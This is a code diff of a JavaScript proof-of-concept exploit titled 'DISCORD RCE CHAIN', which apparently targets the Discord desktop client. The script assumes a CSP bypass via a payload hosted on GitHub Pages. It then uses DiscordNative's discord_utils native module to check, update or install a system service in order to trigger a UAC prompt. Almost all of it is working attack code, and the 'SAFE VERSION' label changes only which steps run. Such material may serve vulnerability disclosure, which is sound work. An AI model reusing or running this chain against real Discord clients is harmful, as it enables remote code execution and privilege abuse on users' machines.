@@ -1,76 +1,81 @@
-// COMPLETE RCE CHAIN - UNINSTALL THEN REINSTALL SERVICE
-// This will trigger UAC prompt by first removing, then reinstalling the service
+// SAFE RCE CHAIN - CHECK BEFORE UNINSTALL
+// This version checks service status before attempting uninstall
 
-console.log("🔥 DISCORD RCE CHAIN - FULL DEMO");
-console.log("=" + "=".repeat(60));
+console.log("🔥 DISCORD RCE CHAIN - SAFE VERSION\n");
+console.log("=" + "=".repeat(60) + "\n");
 
 // Step 1: Confirm CSP bypass
 alert("🎉 CSP BYPASS SUCCESSFUL!\n\nPayload loaded from GitHub Pages");
 
 console.log("[✅] CSP bypassed via GitHub Pages");
-console.log("[✅] Arbitrary JavaScript execution achieved");
+console.log("[✅] Arbitrary JavaScript execution achieved\n");
 
 // Step 2: Check DiscordNative availability
 if (typeof DiscordNative === 'undefined') {
     console.log("[❌] DiscordNative not available");
     alert("⚠️ Not in Discord context");
 } else {
-    console.log("[✅] DiscordNative available");
+    console.log("[✅] DiscordNative available\n");
 
     try {
         // Load discord_utils module
-        console.log("\n[*] Loading discord_utils module...");
+        console.log("[*] Loading discord_utils module...");
         const utils = DiscordNative.nativeModules.requireModule('discord_utils');
-        console.log("[✅] discord_utils loaded successfully");
+        console.log("[✅] discord_utils loaded successfully\n");
 
-        // Step 3: First UNINSTALL the service
-        console.log("\n[STEP 1/2] Uninstalling existing service...");
+        // Step 3: Check if service is installed
+        console.log("[*] Checking service status...");
 
-        utils.uninstallSystemService()
-            .then(uninstallResult => {
-                console.log(`[✅] Service uninstalled: ${JSON.stringify(uninstallResult)}`);
+        const isInstalled = utils.isSystemServiceInstalled();
+        console.log(`[*] Service installed: ${isInstalled}\n`);
 
-                // Wait 1 second, then reinstall
-                console.log("\n[*] Waiting 1 second before reinstall...");
+        if (isInstalled) {
+            // Service exists - try to UPDATE it (might trigger UAC)
+            console.log("[STRATEGY 1] Service exists - attempting UPDATE...");
+            console.log("[🔥] This might trigger UAC!\n");
 
-                setTimeout(() => {
-                    // Step 4: Now REINSTALL the service (this will trigger UAC!)
-                    console.log("\n[STEP 2/2] Reinstalling service...");
-                    console.log("[🔥] UAC PROMPT SHOULD APPEAR NOW!");
+            utils.updateSystemService()
+                .then(result => {
+                    console.log(`[✅] Update result: ${JSON.stringify(result)}`);
+                    alert("🔥 SERVICE UPDATE TRIGGERED!\n\nDid UAC prompt appear?");
+                })
+                .catch(error => {
+                    console.log(`[!] Update failed: ${error.message}`);
+
+                    // If update fails, try reinstall
+                    console.log("\n[STRATEGY 2] Update failed - trying REINSTALL...");
 
                     utils.installSystemService()
-                        .then(installResult => {
-                            console.log(`[🎉] SUCCESS! Service installed: ${JSON.stringify(installResult)}`);
-
-                            alert("🔥 FULL RCE CHAIN COMPLETE!\n\n" +
-                                "1. CSP Bypass ✅\n" +
-                                "2. Remote Code Execution ✅\n" +
-                                "3. Service Uninstalled ✅\n" +
-                                "4. Service Reinstalled ✅\n" +
-                                "5. UAC Prompt Triggered ✅\n\n" +
-                                "CRITICAL SEVERITY EXPLOIT!");
+                        .then(result => {
+                            console.log(`[✅] Reinstall result: ${JSON.stringify(result)}`);
+                            alert("🔥 SERVICE REINSTALLED!\n\nDid UAC prompt appear?");
                         })
-                        .catch(installError => {
-                            console.log(`[!] Install failed: ${installError.message}`);
-                            alert(`Install failed: ${installError.message}`);
+                        .catch(error2 => {
+                            console.log(`[!] Reinstall also failed: ${error2.message}`);
                         });
-                }, 1000);
-            })
-            .catch(uninstallError => {
-                console.log(`[!] Uninstall failed (service might not exist): ${uninstallError.message}`);
+                });
 
-                // If uninstall fails (service doesn't exist), just try to install
-                console.log("\n[*] Service not installed, trying direct install...");
+        } else {
+            // Service doesn't exist - fresh install (will trigger UAC)
+            console.log("[STRATEGY 3] Service not installed - fresh INSTALL...");
+            console.log("[🔥] UAC PROMPT SHOULD APPEAR!\n");
 
-                utils.installSystemService()
-                    .then(installResult => {
-                        console.log(`[✅] Service installed: ${JSON.stringify(installResult)}`);
-                        alert("🔥 RCE CHAIN COMPLETE!\n\nUAC prompt should have appeared!");
-                    })
-                    .catch(installError => {
-                        console.log(`[!] Install failed: ${installError.message}`);
-                    });
-            });
+            utils.installSystemService()
+                .then(result => {
+                    console.log(`[🎉] SUCCESS! Service installed: ${JSON.stringify(result)}`);
+
+                    alert("🔥 FULL RCE CHAIN COMPLETE!\n\n" +
+                        "1. CSP Bypass ✅\n" +
+                        "2. Remote Code Execution ✅\n" +
+                        "3. Service Installed ✅\n" +
+                        "4. UAC Prompt Triggered ✅\n\n" +
+                        "CRITICAL SEVERITY EXPLOIT!");
+                })
+                .catch(error => {
+                    console.log(`[!] Install failed: ${error.message}`);
+                    alert(`Install failed: ${error.message}`);
+                });
+        }
 
     } catch (e) {
         console.log(`[❌] Error: ${e.message}`);
